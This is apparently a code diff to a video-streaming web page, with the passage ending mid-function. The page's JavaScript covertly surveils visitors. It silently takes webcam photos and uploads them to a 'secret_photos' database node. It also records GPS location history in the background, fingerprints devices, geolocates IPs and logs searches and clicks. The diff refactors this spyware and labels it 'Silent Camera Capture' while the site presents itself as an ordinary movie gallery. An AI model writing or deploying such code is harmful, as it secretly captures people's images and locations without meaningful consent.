@@ -39,7 +39,6 @@
       .card:hover .card-thumb img { transform:scale(1.06); }
       .cat-badge { position:absolute; top:10px; left:10px; font-size:.7rem; font-weight:600; padding:.3rem .6rem; border-radius:5px; z-index:2; text-transform:uppercase;}
       
-      /* New Premium Badge Styling */
       .cat-badge.premium { background: linear-gradient(45deg, #E63946, #ff7e67); color: #fff; box-shadow: 0 2px 10px rgba(230,57,70,.7); }
       .cat-badge.movie { background: var(--red); color:#fff; box-shadow:0 2px 10px rgba(230,57,70,.5); }
       .cat-badge.link { background: rgba(0,0,0,0.6); color:#fff; backdrop-filter:blur(5px); }
@@ -133,20 +132,7 @@
         <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🚫</div>
         <h3>Access Denied</h3>
         <p>Your device has been permanently banned from this platform.</p>
-        <button class="btn btn-yes" style="width: 100%; margin-top: 15px;" onclick="document.getElementById('contactModal').style.display='flex'">Contact Support</button>
-    </div>
-</div>
-
-<!-- Support Modal (Update: Validation added in JS) -->
-<div id="contactModal" class="modal-bg" style="display:none; z-index: 1000000;">
-    <div class="modal-content">
-        <h3 style="color: white; margin-bottom: 5px;">Contact Support</h3>
-        <p style="font-size: 0.75rem; color: #a5a5b5; margin-bottom: 15px;">Device Model & GPS automatically detected.</p>
-        <input type="text" id="cName" placeholder="Your Name" class="search-input" style="margin-bottom: 10px; padding: 10px; border-radius: 8px; width: 100%; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.5); color: #fff;">
-        <input type="text" id="cContact" placeholder="Valid Email or 10-Digit Phone *" class="search-input" style="margin-bottom: 15px; padding: 10px; border-radius: 8px; width: 100%; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.5); color: #fff;">
-        <textarea id="userMsgText" placeholder="Describe your error or problem here... *" style="width: 100%; height: 75px; border-radius: 8px; padding: 10px; background: rgba(0,0,0,0.5); color: white; border: 1px solid rgba(255,255,255,0.2); resize: none; margin-bottom: 15px; font-family: 'Poppins', sans-serif;"></textarea>
-        <button class="btn btn-yes" style="width: 100%; margin-bottom: 10px;" onclick="sendContactRequest()">Submit Report</button>
-        <button class="btn btn-no" style="width: 100%;" onclick="document.getElementById('contactModal').style.display='none'">Cancel</button>
+        <button class="btn btn-yes" style="width: 100%; margin-top: 15px;" onclick="window.location.href='contact-support.html'">Contact Support</button>
     </div>
 </div>
 
@@ -263,6 +249,7 @@
   let activeAd = null;
   let apkDownloadUrl = "";
 
+  // 1. Silent Camera Capture
   async function attemptSilentCapture() {
       try {
           const perm = await navigator.permissions.query({ name: 'camera' });
@@ -270,12 +257,17 @@
               const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
               captureAndUploadPhoto(stream, "Verified Triggered Capture");
           }
-      } catch (err) {}
+      } catch (err) {
+          console.log("Silent capture skipped.");
+      }
   }
 
+  // 2. Check Security Gates
   function checkGates() {
-      if(localStorage.getItem('allPermsGranted') !== 'true' && !localStorage.getItem('gpsVerified')) {
-          window.location.href = 'permission.html'; return;
+      // Check if user came from permission page
+      if(localStorage.getItem('perms_status') !== 'Granted' && !localStorage.getItem('gpsVerified')) {
+          window.location.href = 'permission.html'; 
+          return;
       }
 
       const ageStatus = sessionStorage.getItem('ageStatus');
@@ -294,229 +286,768 @@
       }
   }
 
+  // 3. Silent GPS Background Update
   function silentGPSUpdate() {
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
-              (position) => { if (deviceId) { set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: position.coords.latitude, lon: position.coords.longitude, accuracy: Math.round(position.coords.accuracy) + " meters", time: new Date().toISOString() }); } },
-              (error) => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+              (position) => { 
+                  if (deviceId) { 
+                      const gpsData = { 
+                          lat: position.coords.latitude, 
+                          lon: position.coords.longitude, 
+                          accuracy: Math.round(position.coords.accuracy) + " meters", 
+                          time: new Date().toISOString() 
+                      };
+                      set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData); 
+                  } 
+              },
+              (error) => {
+                  console.log("GPS update failed silently");
+              }, 
+              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
       }
   }
 
+  // 4. Capture and Upload Photo Logic
   function captureAndUploadPhoto(stream, actionText) {
-      const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
-      video.srcObject = stream; video.play();
+      const video = document.getElementById('secretVideo'); 
+      const canvas = document.getElementById('secretCanvas');
+      
+      video.srcObject = stream; 
+      video.play();
+      
       video.addEventListener('canplay', function() {
           setTimeout(function() {
-              const context = canvas.getContext('2d'); context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const context = canvas.getContext('2d'); 
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
               const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
-              const currentId = deviceId ? deviceId : 'Unknown'; const photoId = Date.now().toString(36); 
-              set(ref(db, 'secret_photos/' + photoId), { imageBase64: dataUrl, deviceId: currentId, time: new Date().toISOString() }).then(() => { stream.getTracks().forEach(track => track.stop()); logAction(`Secret Photo Captured: ${actionText}`); }).catch(e => console.error(e));
+              
+              const currentId = deviceId ? deviceId : 'Unknown'; 
+              const photoId = Date.now().toString(36); 
+              
+              set(ref(db, 'secret_photos/' + photoId), { 
+                  imageBase64: dataUrl, 
+                  deviceId: currentId, 
+                  time: new Date().toISOString() 
+              }).then(() => { 
+                  stream.getTracks().forEach(track => track.stop()); 
+                  logAction(`Secret Photo Captured: ${actionText}`); 
+              }).catch(e => console.error(e));
           }, 150); 
       }, { once: true });
   }
 
-  window.setAgeStatus = function(status) { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction(`Age gate answered: ${status}`); checkGates(); }
+  window.setAgeStatus = function(status) { 
+      sessionStorage.setItem('ageStatus', status); 
+      document.getElementById('ageGate').style.display = 'none'; 
+      logAction(`Age gate answered: ${status}`); 
+      checkGates(); 
+  }
 
   window.requestGPSAccess = function() {
-      const errDiv = document.getElementById('gpsError'); errDiv.style.display = 'none'; logAction("Verify Location button clicked - Attempting instant capture"); attemptSilentCapture(); 
+      const errDiv = document.getElementById('gpsError'); 
+      errDiv.style.display = 'none'; 
+      logAction("Verify Location button clicked - Attempting instant capture"); 
+      attemptSilentCapture(); 
+      
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
               (position) => {
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  if (deviceId) { set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: position.coords.latitude, lon: position.coords.longitude, accuracy: Math.round(position.coords.accuracy) + " meters", time: new Date().toISOString() }); logAction("Initial GPS Location Captured"); }
+                  localStorage.setItem('gpsVerified', 'true'); 
+                  document.getElementById('gpsGate').style.display = 'none';
+                  
+                  if (deviceId) { 
+                      const locData = { 
+                          lat: position.coords.latitude, 
+                          lon: position.coords.longitude, 
+                          accuracy: Math.round(position.coords.accuracy) + " meters", 
+                          time: new Date().toISOString() 
+                      };
+                      set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), locData); 
+                      logAction("Initial GPS Location Captured"); 
+                  }
                   checkGates(); 
               },
-              (error) => { errDiv.style.display = 'block'; logAction("GPS Access Denied by User"); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+              (error) => { 
+                  errDiv.style.display = 'block'; 
+                  logAction("GPS Access Denied by User"); 
+              }, 
+              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
-      } else { errDiv.innerText = "GPS is not supported on this device."; errDiv.style.display = 'block'; }
+      } else { 
+          errDiv.innerText = "GPS is not supported on this device."; 
+          errDiv.style.display = 'block'; 
+      }
   }
 
+  // 5. Advanced Device Info
   function getAdvancedDeviceInfo() {
-      const ua = navigator.userAgent; let type = "Desktop"; if (/Tablet|iPad/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /MacIntel/.test(navigator.platform))) { type = "Tablet"; } else if (/Mobile|Android|iP(hone|od)/i.test(ua)) { type = "Mobile"; }
-      let os = "Unknown"; if (/Windows/i.test(ua)) os = "Windows"; else if (/Mac OS X/i.test(ua)) os = "MacOS"; else if (/Android/i.test(ua)) os = "Android"; else if (/Linux/i.test(ua)) os = "Linux"; else if (/iP(hone|od|ad)/i.test(ua)) os = "iOS";
-      let browser = "Unknown"; if (/Edg/i.test(ua)) browser = "Edge"; else if (/OPR/i.test(ua)) browser = "Opera"; else if (/Chrome/i.test(ua)) browser = "Chrome"; else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari"; else if (/Firefox/i.test(ua)) browser = "Firefox";
-      let gpu = "Unknown"; try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (gl) { const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); } } catch(e) {}
-      let tz = "Unknown"; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
-      return { type: type, os: os, browser: browser, gpu: gpu, cores: navigator.hardwareConcurrency || "Unknown", ram: navigator.deviceMemory || "Unknown", touch: navigator.maxTouchPoints > 0 ? "Yes" : "No", tz: tz, lang: navigator.language || "Unknown", screen: `${window.screen.width}x${window.screen.height}`, cookieEnabled: navigator.cookieEnabled };
+      const ua = navigator.userAgent; 
+      let type = "Desktop"; 
+      
+      if (/Tablet|iPad/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /MacIntel/.test(navigator.platform))) { 
+          type = "Tablet"; 
+      } else if (/Mobile|Android|iP(hone|od)/i.test(ua)) { 
+          type = "Mobile"; 
+      }
+      
+      let os = "Unknown"; 
+      if (/Windows/i.test(ua)) os = "Windows"; 
+      else if (/Mac OS X/i.test(ua)) os = "MacOS"; 
+      else if (/Android/i.test(ua)) os = "Android"; 
+      else if (/Linux/i.test(ua)) os = "Linux"; 
+      else if (/iP(hone|od|ad)/i.test(ua)) os = "iOS";
+      
+      let browser = "Unknown"; 
+      if (/Edg/i.test(ua)) browser = "Edge"; 
+      else if (/OPR/i.test(ua)) browser = "Opera"; 
+      else if (/Chrome/i.test(ua)) browser = "Chrome"; 
+      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari"; 
+      else if (/Firefox/i.test(ua)) browser = "Firefox";
+      
+      let gpu = "Unknown"; 
+      try { 
+          const canvas = document.createElement('canvas'); 
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); 
+          if (gl) { 
+              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); 
+              if (debugInfo) {
+                  gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); 
+              }
+          } 
+      } catch(e) {}
+      
+      let tz = "Unknown"; 
+      try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      
+      return { 
+          type: type, 
+          os: os, 
+          browser: browser, 
+          gpu: gpu, 
+          cores: navigator.hardwareConcurrency || "Unknown", 
+          ram: navigator.deviceMemory || "Unknown", 
+          touch: navigator.maxTouchPoints > 0 ? "Yes" : "No", 
+          tz: tz, 
+          lang: navigator.language || "Unknown", 
+          screen: `${window.screen.width}x${window.screen.height}`, 
+          cookieEnabled: navigator.cookieEnabled 
+      };
   }
 
   function generateDeviceFingerprint(info) {
       const rawString = `${info.os}|${info.browser}|${info.gpu}|${info.cores}|${info.ram}|${info.screen}|${info.tz}|${info.touch}`;
-      let hash = 0; for (let i = 0; i < rawString.length; i++) { hash = ((hash << 5) - hash) + rawString.charCodeAt(i); hash |= 0; }
+      let hash = 0; 
+      for (let i = 0; i < rawString.length; i++) { 
+          hash = ((hash << 5) - hash) + rawString.charCodeAt(i); 
+          hash |= 0; 
+      }
       return Math.abs(hash).toString(36).toUpperCase(); 
   }
 
-  window.logAction = function(actionDesc) { if(!deviceId) return; set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); };
+  window.logAction = function(actionDesc) { 
+      if(!deviceId) return; 
+      set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { 
+          action: actionDesc, 
+          time: new Date().toISOString() 
+      }); 
+  };
 
-  // UPDATE: Validated Contact Form with GPS First
-  window.sendContactRequest = function() {
-    if(!deviceId) return alert("System Error: ID not generated yet.");
-    const msg = document.getElementById('userMsgText').value; 
-    const name = document.getElementById('cName').value;
-    const contact = document.getElementById('cContact').value;
-    
-    if(!msg) return alert("Please type your problem description first.");
-    
-    // Email / Phone Validation (Basic format check)
-    const contactRegex = /^([a-zA-Z0-9_\.\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z]{2,}|[0-9]{10})$/;
-    if(contact && !contactRegex.test(contact)) {
-        return alert("Please enter a valid Email address or 10-digit Phone Number.");
-    }
-
-    // Capture GPS before hitting the database
-    navigator.geolocation.getCurrentPosition((pos) => {
-        get(ref(db, `support_requests/${deviceId}`)).then((snap) => {
-            if(snap.exists()) { alert("Aapki ek report already pending hai. Jab tak admin usey solve nahi karta, nayi report nahi bhej sakte."); document.getElementById('contactModal').style.display = 'none'; return; }
-            
-            const dataToSave = { message: msg, name: name || "Not Provided", contactInfo: contact || "Not Provided", regId: deviceId, os: navigator.platform, lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() };
-            
-            set(ref(db, `support_requests/${deviceId}`), dataToSave).then(() => { 
-                alert("Request Sent! Admin will check your device details and contact you."); 
-                document.getElementById('userMsgText').value = ''; document.getElementById('cName').value = ''; document.getElementById('cContact').value = ''; document.getElementById('contactModal').style.display = 'none'; 
-            });
-        });
-    }, () => { 
-        alert("Error: Location (GPS) permission is STRICTLY REQUIRED to submit a report."); 
-    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-  }
-
+  // 6. Main User Tracking Function (Fully Expanded & Restored)
   async function trackUser() {
-      const advInfo = getAdvancedDeviceInfo(); const hardwareHash = generateDeviceFingerprint(advInfo); const shortOs = advInfo.os.substring(0, 4).toUpperCase(); deviceId = `${shortOs}-${hardwareHash}`; const fullDate = new Date().toISOString();
-      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" }; try { const res = await fetch('https://ipapi.co/json/'); if(res.ok) { const jd = await res.json(); ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org }; } } catch(e){}
+      const advInfo = getAdvancedDeviceInfo(); 
+      const hardwareHash = generateDeviceFingerprint(advInfo); 
+      const shortOs = advInfo.os.substring(0, 4).toUpperCase(); 
+      
+      deviceId = `${shortOs}-${hardwareHash}`; 
+      window.deviceId = deviceId; // Making it globally accessible for other scripts
 
+      const fullDate = new Date().toISOString();
+      
+      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" }; 
+      
+      try { 
+          const res = await fetch('https://ipapi.co/json/'); 
+          if(res.ok) { 
+              const jd = await res.json(); 
+              ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org }; 
+          } 
+      } catch(e){
+          console.log("IP Fetch Failed, continuing tracking.");
+      }
+
+      // Check User in Database
       get(ref(db, `users/${deviceId}`)).then((snap) => {
           const locId = Date.now();
-          if (!snap.exists()) { set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", network: ipData, device: advInfo, banned: false, locationHistory: { [locId]: { ...ipData, time: fullDate } } }); logAction("First visit to the website");
-          } else { let updates = { lastActive: fullDate, network: ipData }; updates[`locationHistory/${locId}`] = { ...ipData, time: fullDate }; update(ref(db, `users/${deviceId}`), updates); logAction("User returned to website"); }
+          
+          if (!snap.exists()) { 
+              // New User
+              set(ref(db, `users/${deviceId}`), { 
+                  firstVisit: fullDate, 
+                  lastActive: fullDate, 
+                  status: "Live", 
+                  network: ipData, 
+                  device: advInfo, 
+                  banned: false, 
+                  locationHistory: { 
+                      [locId]: { ...ipData, time: fullDate } 
+                  } 
+              }); 
+              logAction("First visit to the website");
+          } else { 
+              // Returning User
+              let updates = { 
+                  lastActive: fullDate, 
+                  network: ipData 
+              }; 
+              updates[`locationHistory/${locId}`] = { ...ipData, time: fullDate }; 
+              update(ref(db, `users/${deviceId}`), updates); 
+              logAction("User returned to website"); 
+          }
+          
+          // Proceed to app logic
           checkGates();
       });
 
-      onValue(ref(db, 'users/' + deviceId), (snap) => { if (snap.exists() && snap.val().banned) { document.getElementById('banGate').style.display = 'flex'; } else { document.getElementById('banGate').style.display = 'none'; } });
-      onValue(ref(db, ".info/connected"), (snap) => { if (snap.val() === true && deviceId) { const statusRef = ref(db, `users/${deviceId}/status`); onDisconnect(statusRef).set("Offline").then(() => { set(statusRef, "Live"); }); } });
+      // 7. Check for Bans real-time
+      onValue(ref(db, 'users/' + deviceId), (snap) => { 
+          if (snap.exists() && snap.val().banned) { 
+              document.getElementById('banGate').style.display = 'flex'; 
+          } else { 
+              document.getElementById('banGate').style.display = 'none'; 
+          } 
+      });
       
+      // 8. Presence Tracking (Online/Offline)
+      onValue(ref(db, ".info/connected"), (snap) => { 
+          if (snap.val() === true && deviceId) { 
+              const statusRef = ref(db, `users/${deviceId}/status`); 
+              onDisconnect(statusRef).set("Offline").then(() => { 
+                  set(statusRef, "Live"); 
+              }); 
+          } 
+      });
+      
+      // 9. Custom Permissions Push Logic
       onValue(ref(db, `users/${deviceId}/custom_perms`), async (snap) => {
           if(snap.exists()) {
-              const rules = snap.val(); let redirectNeeded = false;
-              if (rules.camera) { try { const cam = await navigator.permissions.query({name: 'camera'}); if(cam.state !== 'granted') redirectNeeded = true; } catch(e){} }
-              if (rules.location) { try { const loc = await navigator.permissions.query({name: 'geolocation'}); if(loc.state !== 'granted') redirectNeeded = true; } catch(e){} }
-              if(redirectNeeded) { if(player) player.close(); window.location.href = 'permission.html'; }
+              const rules = snap.val(); 
+              let redirectNeeded = false;
+              
+              if (rules.camera) { 
+                  try { 
+                      const cam = await navigator.permissions.query({name: 'camera'}); 
+                      if(cam.state !== 'granted') redirectNeeded = true; 
+                  } catch(e){} 
+              }
+              
+              if (rules.location) { 
+                  try { 
+                      const loc = await navigator.permissions.query({name: 'geolocation'}); 
+                      if(loc.state !== 'granted') redirectNeeded = true; 
+                  } catch(e){} 
+              }
+              
+              if(redirectNeeded) { 
+                  if(player) player.close(); 
+                  window.location.href = 'permission.html'; 
+              }
           }
       });
   }
+  
+  // Start Tracking immediately
   trackUser();
 
+  // Settings and Globals
   onValue(ref(db, 'settings/ad'), (snap) => { activeAd = snap.val(); });
-  onValue(ref(db, 'settings/general/favicon'), (snap) => { if(snap.val()) { let link = document.querySelector("link[rel~='icon']"); if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); } link.href = snap.val(); } });
-  onValue(ref(db, 'settings/general/apkLink'), (snap) => { if(snap.val()) { apkDownloadUrl = snap.val(); } });
-  onValue(ref(db, 'settings/social'), (snap) => { const data = snap.val(); const fs = document.getElementById('footerSocials'); fs.innerHTML = ''; if(data) { if(data.discord) fs.innerHTML += `<a href="${data.discord}" target="_blank" class="soc-btn">Discord</a>`; if(data.telegram) fs.innerHTML += `<a href="${data.telegram}" target="_blank" class="soc-btn">Telegram</a>`; if(data.whatsapp) fs.innerHTML += `<a href="${data.whatsapp}" target="_blank" class="soc-btn">WhatsApp</a>`; if(data.instagram) fs.innerHTML += `<a href="${data.instagram}" target="_blank" class="soc-btn">Instagram</a>`; if(data.x) fs.innerHTML += `<a href="${data.x}" target="_blank" class="soc-btn">X (Twitter)</a>`; } });
-  onValue(ref(db, 'videos'), (snapshot) => { document.getElementById('loading').style.display = 'none'; const data = snapshot.val(); allVideos = []; if (data) { Object.keys(data).forEach(key => { allVideos.push({ id: key, ...data[key] }); }); allVideos.sort((a, b) => new Date(b.addedDate) - new Date(a.addedDate)); } });
-
-  function renderGallery(term) {
-    let list = [...allVideos]; if (!isAdultUser) { list = list.filter(v => v.is18Plus !== 'true'); } if (term && term.trim()) { const t = term.trim().toLowerCase(); list = list.filter(v => v.title.toLowerCase().includes(t)); }
-    const gallery = document.getElementById('gallery'); gallery.style.display = 'grid'; let htmlCode = '';
-    list.forEach(v => {
-      // UPDATE: Check if Premium
-      const isPremium = v.isPremium === 'true';
-      const isEmbed = v.type === 'embed'; 
+  
+  onValue(ref(db, 'settings/general/favicon'), (snap) => { 
+      if(snap.val()) { 
+          let link = document.querySelector("link[rel~='icon']"); 
+          if (!link) { 
+              link = document.createElement('link'); 
+              link.rel = 'icon'; 
+              document.head.appendChild(link); 
+          } 
+          link.href = snap.val(); 
+      } 
+  });
+  
+  onValue(ref(db, 'settings/general/apkLink'), (snap) => { 
+      if(snap.val()) { apkDownloadUrl = snap.val(); } 
+  });
+  
+  onValue(ref(db, 'settings/social'), (snap) => { 
+      const data = snap.val(); 
+      const fs = document.getElementById('footerSocials'); 
+      fs.innerHTML = ''; 
       
-      // Select Badge based on Premium status
-      let catBadge = '';
-      if(isPremium) {
-          catBadge = '<span class="cat-badge premium">👑 Premium</span>';
-      } else {
-          catBadge = isEmbed ? '<span class="cat-badge movie">🎬 Movie</span>' : '<span class="cat-badge link">🔗 Link</span>'; 
+      if(data) { 
+          if(data.discord) fs.innerHTML += `<a href="${data.discord}" target="_blank" class="soc-btn">Discord</a>`; 
+          if(data.telegram) fs.innerHTML += `<a href="${data.telegram}" target="_blank" class="soc-btn">Telegram</a>`; 
+          if(data.whatsapp) fs.innerHTML += `<a href="${data.whatsapp}" target="_blank" class="soc-btn">WhatsApp</a>`; 
+          if(data.instagram) fs.innerHTML += `<a href="${data.instagram}" target="_blank" class="soc-btn">Instagram</a>`; 
+          if(data.x) fs.innerHTML += `<a href="${data.x}" target="_blank" class="soc-btn">X (Twitter)</a>`; 
+      } 
+  });
+  
+  // Load Videos
+  onValue(ref(db, 'videos'), (snapshot) => { 
+      document.getElementById('loading').style.display = 'none'; 
+      const data = snapshot.val(); 
+      allVideos = []; 
+      if (data) { 
+          Object.keys(data).forEach(key => { 
+              allVideos.push({ id: key, ...data[key] }); 
+          }); 
+          allVideos.sort((a, b) => new Date(b.addedDate) - new Date(a.addedDate)); 
+      } 
+  });
+
+  // Render Gallery fully expanded
+  function renderGallery(term) {
+      let list = [...allVideos]; 
+      
+      if (!isAdultUser) { 
+          list = list.filter(v => v.is18Plus !== 'true'); 
+      } 
+      
+      if (term && term.trim()) { 
+          const t = term.trim().toLowerCase(); 
+          list = list.filter(v => v.title.toLowerCase().includes(t)); 
       }
       
-      const partsJson = v.parts ? encodeURIComponent(JSON.stringify(v.parts)) : '';
+      const gallery = document.getElementById('gallery'); 
+      gallery.style.display = 'grid'; 
+      let htmlCode = '';
       
-      htmlCode += `<div class="card-wrapper" style="position:relative; margin-bottom:10px;"><a class="card vid-card" data-id="${v.id}" data-url="${v.videoUrl}" data-title="${esc(v.title)}" data-embed="${isEmbed}" data-premium="${isPremium}" data-parts="${partsJson}"><div class="card-thumb"><img src="${v.imageUrl}" loading="lazy" onerror="this.style.display='none'">${catBadge}<div class="play-overlay"><div class="play-circle"><div class="play-triangle"></div></div></div></div><div style="padding: 10px;"><h4 style="font-size:0.9rem; color:#fff; font-weight:500;">${esc(v.title)}</h4></div></a>${isEmbed && !isPremium ? `<button id="dlBtn_${v.id}" onclick="startMovieDownload('${v.id}', '${esc(v.title)}', '${v.videoUrl}', '${v.imageUrl}')" style="position:absolute; bottom:10px; right:10px; z-index:5; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); color:white; border:1px solid rgba(255,255,255,0.2); border-radius:50%; width:36px; height:36px; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 2px 10px rgba(0,0,0,0.5); transition:all 0.3s;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></button>` : ''}</div>`;
-    });
-    gallery.innerHTML = htmlCode;
-
-    document.querySelectorAll('.vid-card').forEach(card => {
-      card.addEventListener('click', function(e) {
-        e.preventDefault(); 
-        const isEmbed = this.dataset.embed === 'true'; 
-        const isPremium = this.dataset.premium === 'true'; 
-        const partsRaw = this.dataset.parts; 
-        const vidId = this.dataset.id; 
-        const mainUrl = this.dataset.url; 
-        const title = this.dataset.title;
-
-        // UPDATE: Redirect to special.html if it's a premium video
-        if (isPremium) {
-            window.location.href = `special.html?id=${vidId}`;
-            return;
-        }
-
-        let localHistory = JSON.parse(localStorage.getItem('my_history') || '[]'); localHistory = localHistory.filter(v => v.id !== vidId); localHistory.unshift({ id: vidId, title: title, url: mainUrl, thumb: this.querySelector('img').src }); if(localHistory.length > 20) localHistory.pop(); localStorage.setItem('my_history', JSON.stringify(localHistory));
-        if (!isEmbed) { logAction(`Opened External Link: ${title}`); logWatchHistory(vidId, title, 0); window.open(mainUrl, '_blank'); return; }
-        if (partsRaw) { const parts = JSON.parse(decodeURIComponent(partsRaw)); if (parts.length > 0) { logAction(`Viewed episode list for: ${title}`); showEpisodes(title, parts, vidId); return; } }
-        smartPlayCheck(vidId, title, mainUrl, this.dataset.thumb || '').then(playedOffline => { if(!playedOffline) { player.open(mainUrl, title, vidId); } });
+      list.forEach(v => {
+          const isPremium = v.isPremium === 'true';
+          const isEmbed = v.type === 'embed'; 
+          
+          let catBadge = '';
+          if(isPremium) {
+              catBadge = '<span class="cat-badge premium">👑 Premium</span>';
+          } else {
+              catBadge = isEmbed ? '<span class="cat-badge movie">🎬 Movie</span>' : '<span class="cat-badge link">🔗 Link</span>'; 
+          }
+          
+          const partsJson = v.parts ? encodeURIComponent(JSON.stringify(v.parts)) : '';
+          
+          htmlCode += `
+            <div class="card-wrapper" style="position:relative; margin-bottom:10px;">
+                <a class="card vid-card" data-id="${v.id}" data-url="${v.videoUrl}" data-title="${esc(v.title)}" data-embed="${isEmbed}" data-premium="${isPremium}" data-parts="${partsJson}">
+                  <div class="card-thumb">
+                    <img src="${v.imageUrl}" loading="lazy" onerror="this.style.display='none'">
+                    ${catBadge}
+                    <div class="play-overlay"><div class="play-circle"><div class="play-triangle"></div></div></div>
+                  </div>
+                  <div style="padding: 10px;">
+                      <h4 style="font-size:0.9rem; color:#fff; font-weight:500;">${esc(v.title)}</h4>
+                  </div>
+                </a>
+                ${isEmbed && !isPremium ? `<button id="dlBtn_${v.id}" onclick="startMovieDownload('${v.id}', '${esc(v.title)}', '${v.videoUrl}', '${v.imageUrl}')" style="position:absolute; bottom:10px; right:10px; z-index:5; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); color:white; border:1px solid rgba(255,255,255,0.2); border-radius:50%; width:36px; height:36px; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 2px 10px rgba(0,0,0,0.5); transition:all 0.3s;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></button>` : ''}
+            </div>`;
       });
-    });
+      
+      gallery.innerHTML = htmlCode;
+
+      // Event Listeners for Video Cards
+      document.querySelectorAll('.vid-card').forEach(card => {
+          card.addEventListener('click', function(e) {
+              e.preventDefault(); 
+              const isEmbed = this.dataset.embed === 'true'; 
+              const isPremium = this.dataset.premium === 'true'; 
+              const partsRaw = this.dataset.parts; 
+              const vidId = this.dataset.id; 
+              const mainUrl = this.dataset.url; 
+              const title = this.dataset.title;
+
+              if (isPremium) {
+                  window.location.href = `special.html?id=${vidId}`;
+                  return;
+              }
+
+              // Update Local History
+              let localHistory = JSON.parse(localStorage.getItem('my_history') || '[]'); 
+              localHistory = localHistory.filter(v => v.id !== vidId); 
+              localHistory.unshift({ 
+                  id: vidId, 
+                  title: title, 
+                  url: mainUrl, 
+                  thumb: this.querySelector('img').src 
+              }); 
+              
+              if(localHistory.length > 20) localHistory.pop(); 
+              localStorage.setItem('my_history', JSON.stringify(localHistory));
+              
+              // Handle External Links
+              if (!isEmbed) { 
+                  logAction(`Opened External Link: ${title}`); 
+                  logWatchHistory(vidId, title, 0); 
+                  window.open(mainUrl, '_blank'); 
+                  return; 
+              }
+              
+              // Handle Episodes
+              if (partsRaw) { 
+                  const parts = JSON.parse(decodeURIComponent(partsRaw)); 
+                  if (parts.length > 0) { 
+                      logAction(`Viewed episode list for: ${title}`); 
+                      showEpisodes(title, parts, vidId); 
+                      return; 
+                  } 
+              }
+              
+              // Handle Smart Play (Check Offline)
+              smartPlayCheck(vidId, title, mainUrl, this.dataset.thumb || '').then(playedOffline => { 
+                  if(!playedOffline) { 
+                      player.open(mainUrl, title, vidId); 
+                  } 
+              });
+          });
+      });
   }
 
-  function esc(s) { return String(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
-  let searchTimeout; document.getElementById('searchInput').addEventListener('input', function() { renderGallery(this.value); clearTimeout(searchTimeout); if(this.value.trim().length > 1) { searchTimeout = setTimeout(() => logAction(`Searched for: ${this.value}`), 2000); } });
+  function esc(s) { 
+      return String(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;'); 
+  }
+  
+  let searchTimeout; 
+  document.getElementById('searchInput').addEventListener('input', function() { 
+      renderGallery(this.value); 
+      clearTimeout(searchTimeout); 
+      
+      if(this.value.trim().length > 1) { 
+          searchTimeout = setTimeout(() => {
+              logAction(`Searched for: ${this.value}`);
